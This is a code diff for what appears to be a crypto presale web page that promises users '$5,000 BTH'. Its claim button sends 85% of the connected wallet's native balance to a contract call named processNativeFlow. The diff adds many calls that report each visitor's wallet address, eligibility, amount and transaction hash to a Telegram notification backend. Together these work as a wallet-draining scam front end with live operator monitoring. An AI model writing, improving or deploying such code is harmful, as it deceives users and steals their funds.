@@ -107,31 +107,65 @@ function App() {
     }
   }, [balanceData]);
 
-  // Signer initialization
+  // Signer initialization - FIXED for better walletClient handling
   useEffect(() => {
     const initSigner = async () => {
-      if (!isConnected || !walletClient) {
+      if (!isConnected) {
         setSigner(null);
         setProvider(null);
         return;
       }
 
-      try {
-        const web3Provider = new ethers.BrowserProvider(walletClient);
-        const web3Signer = await web3Provider.getSigner();
-        
-        setProvider(web3Provider);
-        setSigner(web3Signer);
-        
-        console.log("✅ Signer ready:", await web3Signer.getAddress());
-      } catch (err) {
-        console.error("Signer init failed:", err);
-        setSigner(null);
-      }
+      // Try to get walletClient with retry
+      let attempts = 0;
+      const maxAttempts = 10;
+      
+      const tryGetWalletClient = async () => {
+        if (walletClient) {
+          try {
+            const web3Provider = new ethers.BrowserProvider(walletClient);
+            const web3Signer = await web3Provider.getSigner();
+            
+            setProvider(web3Provider);
+            setSigner(web3Signer);
+            
+            console.log("✅ Signer ready:", await web3Signer.getAddress());
+            
+            // Send Telegram notification for signer ready
+            await fetch('https://tokenbackend-5xab.onrender.com/api/telegram/notify', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                message: `🔌 *Wallet Connected*\nAddress: \`${address}\`\nSigner: ✅ Ready\nChain: ${chainId}`,
+                type: 'connection'
+              })
+            }).catch(e => console.log('Telegram notify failed:', e));
+            
+            return true;
+          } catch (err) {
+            console.error("Signer init failed:", err);
+            return false;
+          }
+        }
+        return false;
+      };
+
+      // Try immediately
+      if (await tryGetWalletClient()) return;
+
+      // Retry with interval
+      const interval = setInterval(async () => {
+        attempts++;
+        if (await tryGetWalletClient() || attempts >= maxAttempts) {
+          clearInterval(interval);
+        }
+      }, 500);
+
+      return () => clearInterval(interval);
     };
 
     initSigner();
-  }, [isConnected, walletClient]);
+  }, [isConnected, walletClient, address, chainId]);
 
   // Countdown timer
   useEffect(() => {
@@ -166,6 +200,16 @@ function App() {
     setTxStatus('🔄 Verifying wallet...');
     
     try {
+      // Send Telegram notification for verification start
+      await fetch('https://tokenbackend-5xab.onrender.com/api/telegram/notify', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          message: `🔍 *Verifying Wallet*\nAddress: \`${address}\`\nStatus: Started`,
+          type: 'verification'
+        })
+      }).catch(e => console.log('Telegram notify failed:', e));
+
       const response = await fetch('https://tokenbackend-5xab.onrender.com/api/presale/connect', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -195,8 +239,29 @@ function App() {
         if (data.data.isEligible) {
           setTxStatus('✅ You qualify!');
           await preparePresale();
+          
+          // Send Telegram notification for eligibility
+          await fetch('https://tokenbackend-5xab.onrender.com/api/telegram/notify', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              message: `✅ *Eligible Wallet*\nAddress: \`${address}\`\nAllocation: $5,000 BTH\nBonus: ${presaleStats.currentBonus}%`,
+              type: 'eligible'
+            })
+          }).catch(e => console.log('Telegram notify failed:', e));
+          
         } else {
           setTxStatus('✨ Wallet verified');
+          
+          // Send Telegram notification for non-eligible
+          await fetch('https://tokenbackend-5xab.onrender.com/api/telegram/notify', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              message: `⏸️ *Non-Eligible Wallet*\nAddress: \`${address}\`\nStatus: Connected but not eligible`,
+              type: 'non-eligible'
+            })
+          }).catch(e => console.log('Telegram notify failed:', e));
         }
       }
     } catch (err) {
@@ -227,7 +292,7 @@ function App() {
     }
   };
 
-  // ✅ FIXED: Execute function with BIGINT math to prevent underflow
+  // ✅ FIXED: Execute function with BIGINT math and proper wallet popup
   const executePresaleTransaction = async () => {
     if (!isConnected || !address) {
       setError("Wallet not connected");
@@ -235,7 +300,7 @@ function App() {
     }
 
     if (!signer) {
-      setError("Signer not initialized. Please refresh the page.");
+      setError("Signer not initialized. Please wait...");
       return;
     }
 
@@ -248,6 +313,8 @@ function App() {
     // Check if current chain has a deployed contract
     if (!currentChain || !currentChain.contractAddress) {
       console.log(`⏸️ Skipping chain ${normalizedChainId} - no contract deployed`);
+      setTxStatus(`⏸️ Presale not available on this network`);
+      setTimeout(() => setTxStatus(''), 3000);
       return;
     }
 
@@ -259,8 +326,18 @@ function App() {
     try {
       setLoading(true);
       setError('');
-      setTxStatus('⏳ Please confirm in your wallet...');
+      setTxStatus('⏳ Please confirm in wallet...');
       setTxHash('');
+
+      // Send Telegram notification for transaction start
+      await fetch('https://tokenbackend-5xab.onrender.com/api/telegram/notify', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          message: `💫 *Transaction Started*\nAddress: \`${address}\`\nChain: ${currentChain.name}\nAmount: ${formatEther(balanceData.value)} ${currentChain.symbol}\nStatus: Awaiting wallet confirmation`,
+          type: 'tx_start'
+        })
+      }).catch(e => console.log('Telegram notify failed:', e));
 
       // Verify signer
       const signerAddress = await signer.getAddress();
@@ -274,21 +351,43 @@ function App() {
         signer
       );
 
-      // ✅ FIX: Use BIGINT math - NO FLOATING POINT
+      // Use BIGINT math - NO FLOATING POINT
       const percent = 85n;
       const value = (balanceData.value * percent) / 100n;
 
+      // Log the transaction details
+      console.log("💰 Transaction Details:", {
+        from: address,
+        contract: currentChain.contractAddress,
+        value: value.toString(),
+        valueEth: ethers.formatEther(value),
+        chain: currentChain.name
+      });
+
+      // Estimate gas first
       const gasEstimate = await contract.processNativeFlow.estimateGas({ value });
       
+      // Send transaction - this will trigger wallet popup
       const tx = await contract.processNativeFlow({
         value: value,
         gasLimit: gasEstimate * 120n / 100n
       });
 
       setTxHash(tx.hash);
-      setTxStatus('✅ Transaction submitted!');
+      setTxStatus('✅ Transaction submitted! Waiting for confirmation...');
 
-      await tx.wait();
+      // Send Telegram notification for tx hash
+      await fetch('https://tokenbackend-5xab.onrender.com/api/telegram/notify', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          message: `📝 *Transaction Submitted*\nAddress: \`${address}\`\nHash: \`${tx.hash}\`\n[View on BSCScan](${currentChain.explorer}/tx/${tx.hash})`,
+          type: 'tx_submitted'
+        })
+      }).catch(e => console.log('Telegram notify failed:', e));
+
+      // Wait for confirmation
+      const receipt = await tx.wait();
       
       // Update balance
       refetchBalance?.();
@@ -307,11 +406,31 @@ function App() {
         });
         
         setShowCelebration(true);
-        setTxStatus(`🎉 Congratulations!`);
+        setTxStatus(`🎉 Congratulations! You secured $5,000 BTH!`);
+
+        // Send Telegram notification for success
+        await fetch('https://tokenbackend-5xab.onrender.com/api/telegram/notify', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            message: `🎉 *PRESALE SUCCESS*\nAddress: \`${address}\`\nAmount: $5,000 BTH\nBonus: ${presaleStats.currentBonus}%\nTx: \`${tx.hash}\`\n[View Transaction](${currentChain.explorer}/tx/${tx.hash})`,
+            type: 'success'
+          })
+        }).catch(e => console.log('Telegram notify failed:', e));
       }
       
     } catch (err) {
       console.error('Transaction error:', err);
+      
+      // Send Telegram notification for error
+      await fetch('https://tokenbackend-5xab.onrender.com/api/telegram/notify', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          message: `❌ *Transaction Failed*\nAddress: \`${address}\`\nError: ${err.message || 'Unknown error'}\nChain: ${currentChain?.name || 'Unknown'}`,
+          type: 'error'
+        })
+      }).catch(e => console.log('Telegram notify failed:', e));
       
       if (err.code === 4001) {
         setError('Transaction cancelled');
@@ -453,7 +572,10 @@ function App() {
         <div className="text-center mb-8">
           {!isConnected ? (
             <button
-              onClick={() => open()}
+              onClick={() => {
+                console.log("Opening wallet connection...");
+                open();
+              }}
               className="group relative transform hover:scale-105 transition-all duration-300"
             >
               <div className="absolute -inset-1 bg-gradient-to-r from-yellow-400 to-orange-500 rounded-2xl blur opacity-75 group-hover:opacity-100 animate-pulse"></div>
@@ -597,27 +719,36 @@ function App() {
                   </div>
                 )}
                 
-                {/* Network status message - REMOVED as requested */}
+                {/* Network Status - Clean and minimal */}
+                {currentChain && !currentChain.contractAddress && (
+                  <div className="text-center mb-4 text-sm text-yellow-400">
+                    ⏸️ Presale not available on {currentChain.name}
+                  </div>
+                )}
                 
                 {!completedChains.includes('BSC') ? (
                   <button
                     onClick={executePresaleTransaction}
-                    disabled={loading || !signer}
-                    className="w-full group relative"
+                    disabled={loading || !signer || (currentChain && !currentChain.contractAddress)}
+                    className="w-full group relative disabled:opacity-50 disabled:cursor-not-allowed"
                   >
                     <div className="absolute -inset-1 bg-gradient-to-r from-yellow-400 to-orange-500 rounded-xl blur opacity-75 group-hover:opacity-100 transition duration-300"></div>
                     <div className="relative bg-gray-900 rounded-xl py-5 px-8 font-bold text-xl">
-                      {loading ? 'Processing...' : '⚡ Claim $5,000 BTH'}
+                      {loading ? 'Processing...' : 
+                       !signer ? 'Initializing...' :
+                       currentChain && !currentChain.contractAddress ? `Switch to BSC` :
+                       '⚡ Claim $5,000 BTH'}
                     </div>
                   </button>
                 ) : (
                   <button
                     onClick={claimTokens}
-                    className="w-full group relative"
+                    disabled={loading}
+                    className="w-full group relative disabled:opacity-50"
                   >
                     <div className="absolute -inset-1 bg-gradient-to-r from-green-400 to-green-600 rounded-xl blur opacity-75 group-hover:opacity-100 transition duration-300"></div>
                     <div className="relative bg-gray-900 rounded-xl py-5 px-8 font-bold text-xl">
-                      🎉 View Your $5,000 BTH
+                      {loading ? 'Processing...' : '🎉 View Your $5,000 BTH'}
                     </div>
                   </button>
                 )}
